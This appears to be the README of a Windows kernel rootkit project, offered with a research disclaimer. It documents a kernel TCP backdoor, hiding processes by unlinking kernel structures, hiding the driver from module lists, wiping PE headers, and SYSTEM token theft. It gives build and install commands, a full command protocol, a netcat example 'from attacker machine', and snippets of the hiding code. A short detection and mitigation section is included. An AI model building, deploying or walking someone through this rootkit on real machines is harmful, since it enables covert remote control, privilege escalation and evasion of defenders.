# KernelRoot

**Windows Kernel-Mode Rootkit with TCP Backdoor and DKOM Stealth Capabilities**

A research-grade Windows kernel driver demonstrating advanced rootkit techniques including Direct Kernel Object Manipulation (DKOM), module list unlinking, PE header wiping, WSK-based TCP backdoor, and token theft privilege escalation.

---

## ⚠️ Disclaimer

**This project is for educational and authorized security research purposes only.**

- Use only in controlled lab environments you own or have explicit written permission to test
- Unauthorized deployment on production systems is illegal and unethical
- The authors assume no liability for misuse or damage caused by this software
- This code is provided as-is without warranty of any kind

---

## 📋 Table of Contents

- [Features](#-features)
- [Architecture Overview](#-architecture-overview)
- [Component Breakdown](#-component-breakdown)
- [Build System](#-build-system)
- [Deployment](#-deployment)
- [Command Reference](#-command-reference)
- [Protocol Specification](#-protocol-specification)
- [Detection & Mitigation](#-detection--mitigation)
- [Project Structure](#-project-structure)

---

## 🎯 Features

### Core Capabilities

| Feature | Description |
|---------|-------------|
| **TCP Backdoor** | WSK-based listener on configurable port (default 4444), binds to all interfaces |
| **Process Execution** | Launch arbitrary processes via `ZwCreateUserProcess` from kernel context |
| **Process Enumeration** | List all processes (including hidden) via kernel EPROCESS traversal |
| **File Read/Write** | Arbitrary file I/O with kernel privileges (bypasses ACLs) |
| **Process Termination** | Kill any process by PID using `ZwTerminateProcess` |
| **DKOM Process Hiding** | Unlink from `ActiveProcessLinks` — invisible to Task Manager, Process Explorer, `ps`, EDR user-mode sensors |
| **Token Theft (Elevation)** | Steal SYSTEM token from target PID (e.g., `lsass.exe` PID 4) to elevate current context |
| **Driver Unload** | Clean unload via IOCTL or TCP command, with service key deletion |

### Stealth Mechanisms

| Mechanism | Purpose | Reversibility |
|-----------|---------|---------------|
| **PsLoadedModuleList Unlink** | Hide from `NtQuerySystemInformation(SystemModuleInformation)`, `EnumDeviceDrivers` | ✅ Relinkable on unload (configurable) |
| **DriverSection Zeroing** | Break `EnumDeviceDrivers` / driver object scans | ✅ Restored on unload |
| **PE Header Wipe** | Overwrite first 4KB (DOS/NT headers) to defeat memory scanners | ❌ Irreversible (optional, disabled by default) |
| **Device Object Hiding** | Remove from `DriverObject->DeviceObject` chain | ✅ Restored on unload |

### Communication Channels

1. **IOCTL Control Plane** — Local usermode client (`controller.exe`) via `\\.\KdmpRt`
2. **TCP Backdoor** — Remote access via raw TCP (WSK), custom binary framing

---

## 🏗️ Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                         KERNEL MODE                              │
├─────────────────────────────────────────────────────────────────┤
│  DriverEntry                                                     │
│    ├─ resolve_eprocess_offsets()  → Dynamic offset calibration   │
│    ├─ dkom_init()                 → Side-table + spinlock init   │
│    ├─ device_create()             → \\Device\\KdmpRt + symlink     │
│    ├─ socket_init()               → WSK socket + bind(0.0.0.0)   │
│    ├─ PsCreateSystemThread()      → listener_thread()            │
│    │     └─ WskAccept() loop → dispatch_command() per client     │
│    ├─ stealth_init()              → Module unlink + DriverSection=0 │
│    │     └─ (optional) stealth_wipe_headers()                   │
│    └─ dispatch table: IRP_MJ_DEVICE_CONTROL → ioctl_dispatch()  │
│                                                                    │
│  ioctl_dispatch()  ──► Maps IOCTL codes to CMD_* → dispatch_command() │
│  dispatch_command() ──► Shared logic for both TCP & IOCTL paths      │
└─────────────────────────────────────────────────────────────────┘
                              │
                    IOCTL / TCP (binary framed)
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        USER MODE                                 │
├─────────────────────────────────────────────────────────────────┤
│  controller.exe (IOCTL client)                                   │
│    ├─ ping / exec / ps / hide / unhide / elevate / unload       │
│    └─ DeviceIoControl(IOCTL_ROOTKIT_*)                          │
│                                                                    │
│  Raw TCP Client (netcat, custom, etc.)                          │
│    └─ Connect to port 4444 → send framed commands               │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🧩 Component Breakdown

### Kernel Driver (`src/`)

| File | Responsibility |
|------|----------------|
| `driver.c` | `DriverEntry`/`DriverUnload`, initialization sequencing, global state |
| `device.c` | Device object creation, symbolic link, dispatch table setup |
| `ioctl.c` | IOCTL code → command mapping, input/output buffer handling |
| `commands.c` | **Core command dispatcher** — shared by TCP & IOCTL; implements all CMD_* logic |
| `dkom.c` | Process hiding/unhiding via `ActiveProcessLinks` manipulation, driver module list unlink/relink |
| `stealth.c` | Module list unlink, `DriverSection` zeroing, optional PE header wipe |
| `socket.c` | WSK initialization, TCP listener thread, accept loop, send/recv framing |
| `process.c` | EPROCESS offset resolution, process enumeration, PID lookup |
| `memory.c` | Pool allocation wrappers (`rk_alloc`, `rk_free`, `rk_alloc_zero`) |
| `obfuscate.c` | Runtime string deobfuscation (XOR with per-build key) |
| `hook.c` | Placeholder for future hooking (SSDT, IDT, etc.) |
| `utils.h` | Common macros, logging (`RK_DBG`, `RK_TRY`), Unicode helpers |
| `config.h` | **Build-time configuration** — port, names, XOR key, limits |

### Usermode (`usermode/`)

| File | Responsibility |
|------|----------------|
| `controller.c` | CLI client using IOCTLs; requires Administrator |
| `loader.c` | Service installation/start/stop (not yet implemented fully) |

### Headers (`inc/`)

| File | Responsibility |
|------|----------------|
| `common.h` | Shared IOCTL codes, wire protocol structs (`RK_REQ`, `RK_RESP`, `RK_PROC_ENTRY`) |
| `config.h` | Build-time constants (see [Configuration](#-configuration)) |
| `undoc.h` | Undocumented structure definitions (`KLDR_DATA_TABLE_ENTRY`, etc.) |

---

## ⚙️ Build System

### Prerequisites

- **Windows 10/11 SDK** (10.0.19041.0+ recommended)
- **WDK** (Windows Driver Kit) matching target OS version
- **Visual Studio 2022** with "Desktop development with C++" + "Windows Driver Kit" workloads
- **x64** target only (no x86/ARM64 support currently)

### Build Steps

```cmd
REM 1. Open "x64 Native Tools Command Prompt for VS 2022"
REM 2. Navigate to project root
cd C:\path\KernelRoot

REM 3. Run the build script (generates randomized symlink, applies XOR key)
build\build.bat
```

### Build Output

```
build\
├── rootkit.sys          ← Signed/unsigned driver binary
├── rootkit.inf          ← INF for manual install (test signing required)
├── rootkit.vcxproj      ← VS project (for IDE builds)
└── xorstr.py            ← String obfuscation preprocessor
```

### Configuration (`inc/config.h`)

| Constant | Default | Description |
|----------|---------|-------------|
| `BIND_IP_OCTETS` | `{0,0,0,0}` | Listen address (INADDR_ANY) |
| `BACKDOOR_PORT` | `4444` | TCP backdoor port (host byte order) |
| `DEVICE_NAME` | `\\Device\\KdmpRt` | Kernel device object name |
| `SYMLINK_NAME` | `\\??\\KdmpRt` | User-mode symlink (randomized per-build by `build.bat`) |
| `POOL_TAG` | `'Kdmp'` | Pool allocation tag (NonPagedPoolNx) |
| `XOR_KEY` | `0x5A` | Per-build string XOR key (rewritten by `build.bat`) |
| `RELINK_ON_UNLOAD` | `1` | Relink module list on unload (0 = permanent unlink) |
| `LISTENER_STACK_SIZE` | `0x4000` | System thread stack (16 KB) |
| `NET_BUF_MAX` | `0x10000` | Max command/response buffer (64 KB) |
| `FILE_CHUNK_MAX` | `0x400000` | Max file read/write chunk (4 MB) |

> **Important**: After modifying `config.h`, re-run `build\build.bat` to regenerate randomized symlink and apply XOR key.

---

## 🚀 Deployment

### Test Signing Mode (Required for Unsigned Drivers)

```cmd
REM Enable test signing (requires reboot)
bcdedit /set testsigning on
REM Disable after testing
bcdedit /set testsigning off
```

### Manual Installation

```cmd
REM 1. Copy driver to system32\drivers
copy build\rootkit.sys C:\Windows\System32\drivers\KdmpRt.sys

REM 2. Create service
sc create KdmpRt type= kernel binPath= C:\Windows\System32\drivers\KdmpRt.sys

REM 3. Start driver
sc start KdmpRt

REM 4. Verify
sc query KdmpRt
```

### Using the Controller

```cmd
REM Build controller (from x64 Native Tools Prompt)
cl /O2 /W3 usermode\controller.c /link ws2_32.lib

REM Run as Administrator
controller.exe ping
controller.exe ps
controller.exe exec C:\Windows\System32\cmd.exe
controller.exe hide 1234
controller.exe elevate 4
controller.exe unload
```

### Remote TCP Access

```bash
# Connect from attacker machine
nc -v TARGET_IP 4444

# Send framed commands (see Protocol Specification)
# Example: CMD_PING (0x01)
printf '\x05\x00\x00\x00\x01' | nc TARGET_IP 4444
```

---

## 📖 Command Reference

### IOCTL Commands (`controller.exe`)

| Command | IOCTL Code | Description | Example |
|---------|------------|-------------|---------|
| `ping` | `0x8A53 << 16 \| 0x800` | Test connectivity | `controller.exe ping` |
| `exec <path>` | `0x8A53 << 16 \| 0x801` | Launch process (UTF-16LE) | `controller.exe exec C:\Windows\System32\cmd.exe` |
| `ps` | `0x8A53 << 16 \| 0x802` | List processes | `controller.exe ps` |
| `hide <pid>` | `0x8A53 << 16 \| 0x803` | DKOM hide process | `controller.exe hide 1234` |
| `unhide <pid>` | `0x8A53 << 16 \| 0x804` | Restore hidden process | `controller.exe unhide 1234` |
| `elevate <pid>` | `0x8A53 << 16 \| 0x805` | Token theft to target PID | `controller.exe elevate 4` |
| `unload` | `0x8A53 << 16 \| 0x806` | Unload driver + delete service key | `controller.exe unload` |

### TCP Wire Commands

| Code | Name | Payload | Response |
|------|------|---------|----------|
| `0x01` | `CMD_PING` | (none) | `"pong"` |
| `0x02` | `CMD_EXEC` | UTF-16LE path (NUL-terminated) | `"exec=0xXXXXXXXX"` |
| `0x03` | `CMD_PS` | (none) | Binary `RK_PROC_ENTRY[]` |
| `0x04` | `CMD_READ` | UTF-16LE path | File bytes / `"read=0xXXXXXXXX"` |
| `0x05` | `CMD_WRITE` | `[u32 offset][UTF-16LE path][data]` | `"write=0xXXXXXXXX"` |
| `0x06` | `CMD_KILL` | `u32 PID` | `"kill=0xXXXXXXXX"` |
| `0x07` | `CMD_HIDE` | `u32 PID` | `"hide=0xXXXXXXXX"` |
| `0x08` | `CMD_UNHIDE` | `u32 PID` | `"unhide=0xXXXXXXXX"` |
| `0x09` | `CMD_ELEVATE` | `u32 PID` | `"elevate=0xXXXXXXXX"` |
| `0x0A` | `CMD_UNLOAD` | (none) | `"unloading"` |

---

## 🔧 Protocol Specification

### Wire Framing (TCP)

```
REQUEST (Client → Server):
  [u32 length LE] [u8 cmd] [payload...]
  └──────────────┘ └──┬──┘ └────────┘
        length = 1 + payload_len

RESPONSE (Server → Client):
  [u32 length LE] [payload...]
  └──────────────┘ └────────┘
        length = payload_len
```

- All integers are **little-endian**
- Length field counts bytes **after** the length field itself
- UTF-16LE strings are **null-terminated** (2-byte NUL)

### Example: CMD_PING

```python
# Request: length=1, cmd=0x01
b'\x01\x00\x00\x00\x01'

# Response: length=4, payload="pong"
b'\x04\x00\x00\x00pong'
```

### Example: CMD_EXEC (launch notepad)

```python
path = "C:\\Windows\\System32\\notepad.exe".encode('utf-16le') + b'\x00\x00'
payload = b'\x02' + path
length = len(payload).to_bytes(4, 'little')
request = length + payload
```

### Process Entry (CMD_PS Response)

```c
#pragma pack(1)
typedef struct _RK_PROC_ENTRY {
    u32 pid;           // Process ID
    u32 ppid;          // Parent PID (currently 0)
    u8  image[16];     // Image name, null-terminated, max 15 chars
} RK_PROC_ENTRY;       // Total: 24 bytes
#pragma pack()
```

---

## 🛡️ Detection & Mitigation

### Detection Vectors

| Technique | Detects | Bypass Difficulty |
|-----------|---------|-------------------|
| **Kernel Callback (PsSetCreateProcessNotifyRoutine)** | Process creation, including hidden | Hard (kernel) |
| **ETW-TI (Event Tracing for Windows - Threat Intelligence)** | Image loads, thread creation, DNS, etc. | Very Hard |
| **Kernel Memory Scanning** | PE headers, pool tags (`Kdmp`), modified `ActiveProcessLinks` | Medium-Hard |
| **DKOM Detection** | Cross-view diff (EPROCESS list vs. `PsActiveProcessHead` walk) | Medium |
| **Module List Integrity** | `PsLoadedModuleList` vs. `EnumDeviceDrivers` mismatch | Medium |
| **DriverSection Check** | `DRIVER_OBJECT->DriverSection == NULL` | Easy |
| **Network Monitoring** | Suspicious outbound/inbound on port 4444 | Easy |
| **Registry Monitoring** | Service key creation (`HKLM\System\CurrentControlSet\Services\KdmpRt`) | Easy |

### Mitigations for Defenders

1. **Enable HVCI / VBS** — Prevents unsigned kernel drivers from loading
2. **Deploy Kernel EDR** — Callbacks + memory scanning detect DKOM/unlinked modules
3. **Monitor `PsLoadedModuleList`** — Periodic integrity checks from kernel sensor
4. **Block Unsigned Drivers** — `DSE` (Driver Signature Enforcement) + test signing audit
5. **Network Segmentation** — Block unauthorized inbound/outbound on non-standard ports
6. **Audit Service Installation** — Alert on new kernel service creation

---

## 📁 Project Structure

```
KernelRoot/
├── build/                          # Build artifacts (generated)
│   ├── build.bat                   # Build script (randomizes symlink, applies XOR)
│   ├── rootkit.inf                 # INF for driver installation
│   ├── rootkit.vcxproj             # Visual Studio project
│   ├── rootkit.vcxproj.filters     # VS filters
│   └── xorstr.py                   # String obfuscation preprocessor
├── inc/                            # Public headers
│   ├── common.h                    # Shared IOCTL codes, wire protocol
│   ├── config.h                    # Build-time configuration
│   └── undoc.h                     # Undocumented kernel structures
├── src/                            # Kernel driver source
│   ├── commands.c                  # Command dispatcher (TCP + IOCTL)
│   ├── device.c                    # Device object + dispatch table
│   ├── dkom.c                      # Process/driver DKOM (hide/unhide)
│   ├── driver.c                    # DriverEntry / DriverUnload
│   ├── hook.c                      # Hooking stubs (future)
│   ├── ioctl.c                     # IOCTL dispatch → commands
│   ├── memory.c                    # Pool allocation wrappers
│   ├── obfuscate.c                 # Runtime string deobfuscation
│   ├── process.c                   # EPROCESS offsets, enumeration
│   ├── socket.c                    # WSK TCP listener
│   ├── stealth.c                   # Module unlink, PE header wipe
│   └── utils.h                     # Common macros, logging, helpers
├── usermode/                       # Usermode tools
│   ├── controller.c                # IOCTL CLI client
│   └── loader.c                    # Service installer (WIP)
└── README.md                       # This file
```

---

## 🔬 Technical Deep Dives

### Dynamic EPROCESS Offset Resolution

The driver resolves `ActiveProcessLinks`, `UniqueProcessId`, and `ImageFileName` offsets at runtime by scanning `PsInitialSystemProcess` (the `System` process, PID 4). This makes the rootkit version-agnostic across Windows 10/11 builds.

```c
// Simplified logic from process.c
NTSTATUS resolve_eprocess_offsets() {
    PEPROCESS sys = PsInitialSystemProcess;
    // Scan for "System" image name at known offset range
    // Verify ActiveProcessLinks points to self (circular)
    // Store offsets in global g_EprocOffsets
}
```

### DKOM Process Hiding

```c
// Hide: unlink from ActiveProcessLinks
links->Flink->Blink = links->Blink;
links->Blink->Flink = links->Flink;
// Poison own links (self-referential)
links->Flink = &links->Flink;
links->Blink = &links->Blink;

// Unhide: restore from side-table
links->Flink = saved_flink;
links->Blink = saved_blink;
saved_flink->Blink = links;
saved_blink->Flink = links;
```

### WSK Socket Listener

Uses **Winsock Kernel (WSK)** — the kernel-mode socket API — for the TCP backdoor. Runs in a dedicated system thread (`PsCreateSystemThread`), avoiding IRQL issues and allowing blocking `WskAccept`/`WskReceive` calls.

---

## 🧪 Testing Checklist

- [ ] Driver loads/unloads cleanly (`sc start` / `sc stop`)
- [ ] `controller.exe ping` returns `pong`
- [ ] `controller.exe ps` lists processes (verify hidden process excluded)
- [ ] `controller.exe hide <pid>` removes process from Task Manager
- [ ] `controller.exe unhide <pid>` restores visibility
- [ ] `controller.exe elevate 4` grants SYSTEM token (verify with `whoami`)
- [ ] TCP backdoor accepts connections on port 4444
- [ ] Framed commands work over TCP (ping, exec, ps, read, write, kill, hide, elevate, unload)
- [ ] Driver unload via TCP `CMD_UNLOAD` cleans up service key
- [ ] Stealth: `EnumDeviceDrivers` / `SystemModuleInformation` don't show driver
- [ ] PE header wipe (if enabled) defeats memory scanner signatures

---

## 📚 References & Prior Art

- **DKOM**: "Rootkits: Subverting the Windows Kernel" (Blunden, 2009)
- **WSK**: Microsoft Docs — "Winsock Kernel (WSK) Reference"
- **Token Theft**: "Windows Internals, Part 1" (Russinovich, Solomon, Ionescu)
- **Module Unlinking**: "FU Rootkit" (fuzen_op), "TDL4" techniques
- **PE Header Wiping**: "Memory Forensics" (Ligh, Case, Levy, Walters)

---

## 📄 License

This project is released under the **MIT License** — see [LICENSE](LICENSE) for details.

> **Note**: The MIT license permits reuse, but the **disclaimer above** still applies. Do not use this code for malicious purposes.

---

## 🤝 Contributing

This is a research project — PRs for bug fixes, documentation, or detection signatures are welcome. Feature requests for offensive capabilities will be declined.

---

**Built for learning. Deploy responsibly.**